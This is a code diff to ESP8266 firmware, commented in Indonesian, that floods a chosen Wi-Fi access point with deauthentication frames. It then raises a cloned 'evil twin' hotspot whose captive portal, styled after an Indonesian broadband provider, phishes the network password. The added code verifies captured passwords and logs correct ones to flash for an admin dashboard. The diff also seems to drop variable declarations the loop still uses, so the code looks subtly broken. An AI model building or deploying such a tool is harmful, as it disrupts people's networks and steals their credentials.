@@ -2,6 +2,7 @@
 #include <ESP8266WiFi.h>
 #include <DNSServer.h>
 #include <ESP8266WebServer.h>
+#include <LittleFS.h> // Tambahan untuk simpan file
 
 // Library tambahan untuk OLED
 #include <Wire.h>
@@ -18,15 +19,13 @@ extern "C" {
 #define OLED_RESET    -1 
 Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
 
-// Pin LED Built-in Wemos
 #define LED_PIN 2
 
-typedef struct
-{
+typedef struct {
   String ssid;
   uint8_t ch;
   uint8_t bssid[6];
-}  _Network;
+} _Network;
 
 const byte DNS_PORT = 53;
 IPAddress apIP(192, 168, 1, 1);
@@ -36,24 +35,50 @@ ESP8266WebServer webServer(80);
 _Network _networks[16];
 _Network _selectedNetwork;
 
-// Fungsi Update OLED
+String _correct = "";
+String _tryPassword = "";
+bool hotspot_active = false;
+bool deauthing_active = false;
+
+// Fungsi Simpan ke pass.txt
+void savePassword(String data) {
+  File f = LittleFS.open("/pass.txt", "a"); // Mode 'a' untuk append (tambah baris baru)
+  if (f) {
+    f.println(data);
+    f.close();
+  }
+}
+
+// Fungsi Baca pass.txt untuk ditampilkan di Dashboard
+String readPasswords() {
+  if (!LittleFS.exists("/pass.txt")) return "Belum ada log.";
+  File f = LittleFS.open("/pass.txt", "r");
+  String content = "";
+  while (f.available()) {
+    content += f.readStringUntil('\n') + "<br>";
+  }
+  f.close();
+  return content;
+}
+
 void updateOLED(String status) {
-  display.clearDisplay();
+  display.clearDisplay(); // KUNCI: Menghapus tumpukan teks lama
   display.setTextSize(1);
   display.setTextColor(SSD1306_WHITE);
   display.setCursor(0,0);
   display.println("GMpro87");
   display.println("-------");
+  display.setCursor(0, 18);
   display.println(status);
+  
   if(_selectedNetwork.ssid != "") {
-    display.setCursor(0, 28);
-    display.print("TGT:");
+    display.setCursor(0, 38);
+    display.print("T:"); 
     display.println(_selectedNetwork.ssid.substring(0,8));
   }
   display.display();
 }
 
-// Fungsi Strobo LED
 void ledStrobo() {
   for(int i=0; i<30; i++) {
     digitalWrite(LED_PIN, LOW); delay(30);
@@ -68,10 +93,17 @@ void clearArray() {
   }
 }
 
-String _correct = "";
-String _tryPassword = "";
+String bytesToStr(const uint8_t* b, uint32_t size) {
+  String str;
+  for (uint32_t i = 0; i < size; i++) {
+    if (b[i] < 0x10) str += '0';
+    str += String(b[i], HEX);
+    if (i < size - 1) str += ':';
+  }
+  return str;
+}
 
-// CSS & HTML Dashboard Admin (Dark Mode)
+// Dashboard Admin (Tanpa Sunat)
 String _tempHTML = R"rawliteral(
 <html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>
 <style>
@@ -81,12 +113,13 @@ String _tempHTML = R"rawliteral(
   .btns { margin-bottom: 20px; display: flex; justify-content: center; gap: 10px; }
   button { padding: 12px 15px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; font-size: 11px;}
   .btn-act { background: #444; color: white; }
-  .btn-act:disabled { background: #222; color: #555; cursor: not-allowed; }
+  .btn-act:disabled { background: #222; color: #666; cursor: not-allowed; }
   table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #1c1c1c; border-radius: 8px; overflow: hidden; }
   th { background: #333; color: #ee2e24; padding: 10px; font-size: 12px; }
   td { padding: 10px; border-bottom: 1px solid #282828; font-size: 11px; }
   .btn-sel { background: #555; color: white; padding: 6px 10px; border-radius: 4px; border: none; }
   .selected { background: #2e7d32 !important; color: white; font-weight: bold; }
+  .log-box { margin-top: 20px; text-align: left; background: #000; padding: 10px; border-radius: 5px; font-size: 10px; color: #0f0; border: 1px solid #333; }
 </style>
 </head><body><div class='content'>
 <h1>GMpro87</h1>
@@ -95,85 +128,50 @@ String _tempHTML = R"rawliteral(
 <button class='btn-act'{disabled}>{deauth_button}</button></form>
 <form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>
 <button class='btn-act'{disabled}>{hotspot_button}</button></form>
+<form style='display:inline-block; padding-left:8px;' method='post' action='/?clear=1'>
+<button class='btn-act' style='background:#800;'>Clear Log</button></form>
 </div><table><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Select</th></tr>
 )rawliteral";
 
-void setup() {
-  Serial.begin(115200);
-  pinMode(LED_PIN, OUTPUT);
-  digitalWrite(LED_PIN, HIGH);
-
-  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
-    Serial.println(F("OLED gagal"));
-  }
-  updateOLED("Ready");
-
-  WiFi.mode(WIFI_AP_STA);
-  wifi_promiscuous_enable(1);
-  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-  
-  // SSID & PASS Admin GMpro
-  WiFi.softAP("GMpro", "Sangkur87");
-  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-
-  webServer.on("/", handleIndex);
-  webServer.on("/result", handleResult);
-  webServer.on("/CurrentTarget", []() {
-    webServer.send(200, "text/plain", _selectedNetwork.ssid);
-  });
-  webServer.onNotFound(handleIndex);
-  webServer.begin();
-}
-
-void performScan() {
-  updateOLED("Scanning");
-  int n = WiFi.scanNetworks();
-  clearArray();
-  if (n >= 0) {
-    for (int i = 0; i < n && i < 16; ++i) {
-      _Network network;
-      network.ssid = WiFi.SSID(i);
-      for (int j = 0; j < 6; j++) {
-        network.bssid[j] = WiFi.BSSID(i)[j];
-      }
-      network.ch = WiFi.channel(i);
-      _networks[i] = network;
-    }
-  }
-  updateOLED("Scan Done");
-}
-
-bool hotspot_active = false;
-bool deauthing_active = false;
-
 void handleResult() {
+  int timeout = 0;
+  updateOLED("Checking...");
+  while (WiFi.status() != WL_CONNECTED && timeout < 25) {
+    delay(500);
+    timeout++;
+  }
+
   if (WiFi.status() != WL_CONNECTED) {
-    webServer.send(200, "text/html", "<html><head><script>setTimeout(function(){window.location.href='/';},3000);</script><body><h2>Wrong Password</h2></body></html>");
+    webServer.send(200, "text/html", "<html><head><script>setTimeout(function(){window.location.href='/';},2000);</script><body><h2 style='color:red;text-align:center;'>Password Salah!</h2></body></html>");
+    updateOLED("WRONG PASS");
   } else {
-    webServer.send(200, "text/html", "<html><body><h2>Good password</h2></body></html>");
+    webServer.send(200, "text/html", "<html><body><h2 style='color:green;text-align:center;'>Password Benar! ESP Berhenti.</h2></body></html>");
+    
+    // Simpan ke memori internal
+    String logEntry = "SSID: " + _selectedNetwork.ssid + " | PASS: " + _tryPassword;
+    savePassword(logEntry);
+    
     hotspot_active = false;
+    deauthing_active = false;
     dnsServer.stop();
-    WiFi.softAPdisconnect (true);
+    WiFi.softAPdisconnect(true);
+    
     WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
     WiFi.softAP("GMpro", "Sangkur87");
-    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
     
-    _correct = "DAPET! SSID: " + _selectedNetwork.ssid + " PASS: " + _tryPassword;
-    
-    // Tampilkan di OLED
-    display.clearDisplay();
-    display.setCursor(0,0);
-    display.println("PASS GOT!");
-    display.println("---------");
-    display.println(_selectedNetwork.ssid.substring(0,10));
-    display.println(_tryPassword);
-    display.display();
-    
+    _correct = logEntry;
+    updateOLED("PASS SAVED!");
     ledStrobo();
   }
 }
 
 void handleIndex() {
+  if (webServer.hasArg("clear")) {
+    LittleFS.remove("/pass.txt");
+    _correct = "";
+  }
+  
   if (webServer.hasArg("ap")) {
     for (int i = 0; i < 16; i++) {
       if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
@@ -194,7 +192,7 @@ void handleIndex() {
       WiFi.softAPdisconnect (true);
       WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
       WiFi.softAP(_selectedNetwork.ssid.c_str());
-      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
       updateOLED("EVIL ON");
     } else if (webServer.arg("hotspot") == "stop") {
       hotspot_active = false;
@@ -202,7 +200,7 @@ void handleIndex() {
       WiFi.softAPdisconnect (true);
       WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
       WiFi.softAP("GMpro", "Sangkur87");
-      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
       updateOLED("EVIL OFF");
     }
     return;
@@ -225,7 +223,7 @@ void handleIndex() {
     _html.replace("{disabled}", (_selectedNetwork.ssid == "") ? " disabled" : "");
 
     _html += "</table>";
-    if (_correct != "") _html += "</br><div style='color:#2ecc71; font-weight:bold;'>" + _correct + "</div>";
+    _html += "<div class='log-box'><strong>Stored Passwords:</strong><br>" + readPasswords() + "</div>";
     _html += "</div></body></html>";
     webServer.send(200, "text/html", _html);
 
@@ -234,77 +232,83 @@ void handleIndex() {
       _tryPassword = webServer.arg("password");
       WiFi.disconnect();
       WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
-      webServer.send(200, "text/html", "<h2>Updating...</h2>");
+      handleResult();
     } else {
-      // Portal Evil Twin Telkom/Indihome
       String portalHTML = R"rawliteral(
-<!DOCTYPE html><html><head><title id="TARGET">Autentikasi Broadband</title><meta name="viewport" content="width=device-width,initial-scale=1">
+<!DOCTYPE html><html><head><title>Broadband Authentication</title><meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
 body { color: #333; font-family: 'Arial', sans-serif; margin: 0; padding: 0; background-color: #f4f4f4; }
 nav { background: #ee2e24; color: #fff; padding: 1.5em 1em; text-align: center; border-bottom: 4px solid #d1271f; }
-nav b { display: block; font-size: 1.4em; text-transform: uppercase; }
 .main-content { background: #fff; margin: 20px auto; padding: 2em; max-width: 400px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-h1 { font-size: 1.2em; color: #ee2e24; text-align: center; }
-.status-msg { background: #fff5f5; border: 1px solid #feb2b2; color: #c53030; padding: 10px; font-size: 0.9em; margin-bottom: 1.5em; border-radius: 4px; text-align: center; }
-input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
-input[type="submit"] { width: 100%; padding: 12px; background-color: #ee2e24; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
-.footer { text-align: center; margin-top: 2em; font-size: 10px; color: #999; }
-</style></head><body><nav><b id="SSID">Connecting...</b><p>INDIHOME FIBER BROADBAND</p></nav>
-<div class="main-content"><h1>Verifikasi Kata Sandi</h1><div class="status-msg">Sesi terputus. Silakan masukkan ulang password Wi-Fi Anda.</div>
-<form action="/"><label><b>Password Wi-Fi:</b></label><input type="password" name="password" minlength="8" required><input type="submit" value="HUBUNGKAN SEKARANG"></form></div>
-<div class="footer">&copy; 2026 PT Telkom Indonesia (Persero) Tbk.</div>
-<script>var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.readyState==4&&this.status==200){document.getElementById("SSID").innerHTML=this.responseText;}};xhttp.open("GET","/CurrentTarget",true);xhttp.send();</script></body></html>
+input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+input[type="submit"] { width: 100%; padding: 12px; background-color: #ee2e24; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
+</style></head><body><nav><b>Broadband Authentication</b></nav>
+<div class="main-content"><h1>Verifikasi Password</h1><p>Sesi anda berakhir, silakan masukkan kembali password Wi-Fi untuk menyambung.</p>
+<form action="/"><input type="password" name="password" minlength="8" required><input type="submit" value="LOGIN"></form></div>
+</body></html>
 )rawliteral";
       webServer.send(200, "text/html", portalHTML);
     }
   }
 }
 
-String bytesToStr(const uint8_t* b, uint32_t size) {
-  String str;
-  for (uint32_t i = 0; i < size; i++) {
-    if (b[i] < 0x10) str += '0';
-    str += String(b[i], HEX);
-    if (i < size - 1) str += ':';
-  }
-  return str;
-}
+void setup() {
+  Serial.begin(115200);
+  LittleFS.begin(); // Mulai memori internal
+  pinMode(LED_PIN, OUTPUT);
+  digitalWrite(LED_PIN, HIGH);
 
-unsigned long now = 0;
-unsigned long wifinow = 0;
-unsigned long deauth_now = 0;
-bool led_state = false;
+  Wire.begin(4, 5); 
+  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { Serial.println(F("OLED gagal")); }
+  display.clearDisplay();
+  updateOLED("Ready");
+
+  WiFi.mode(WIFI_AP_STA);
+  wifi_promiscuous_enable(1);
+  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
+  WiFi.softAP("GMpro", "Sangkur87");
+  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+
+  webServer.on("/", handleIndex);
+  webServer.on("/CurrentTarget", []() {
+    webServer.send(200, "text/plain", _selectedNetwork.ssid);
+  });
+  webServer.onNotFound(handleIndex);
+  webServer.begin();
+}
 
 void loop() {
   dnsServer.processNextRequest();
   webServer.handleClient();
 
   if (deauthing_active && millis() - deauth_now >= 1000) {
-    // LED Kedip saat Deauth
     led_state = !led_state;
     digitalWrite(LED_PIN, led_state);
-
     wifi_set_channel(_selectedNetwork.ch);
     uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
     memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
     memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
-    deauthPacket[24] = 1;
-    deauthPacket[0] = 0xC0;
+    deauthPacket[24] = 1; deauthPacket[0] = 0xC0;
     wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
     deauthPacket[0] = 0xA0;
     wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
     deauth_now = millis();
   }
 
-  // Jika Hotspot Aktif saja, LED Nyala terus
-  if (hotspot_active && !deauthing_active) {
-    digitalWrite(LED_PIN, LOW); 
-  } else if (!hotspot_active && !deauthing_active) {
-    digitalWrite(LED_PIN, HIGH); 
-  }
+  if (hotspot_active && !deauthing_active) digitalWrite(LED_PIN, LOW); 
+  else if (!hotspot_active && !deauthing_active) digitalWrite(LED_PIN, HIGH);
 
-  if (millis() - now >= 15000) {
-    performScan();
-    now = millis();
+  static unsigned long scanNow = 0;
+  if (millis() - scanNow >= 15000 && !hotspot_active && !deauthing_active) {
+    int n = WiFi.scanNetworks();
+    clearArray();
+    if (n >= 0) {
+      for (int i = 0; i < n && i < 16; ++i) {
+        _networks[i].ssid = WiFi.SSID(i);
+        for (int j = 0; j < 6; j++) _networks[i].bssid[j] = WiFi.BSSID(i)[j];
+        _networks[i].ch = WiFi.channel(i);
+      }
+    }
+    scanNow = millis();
   }
 }
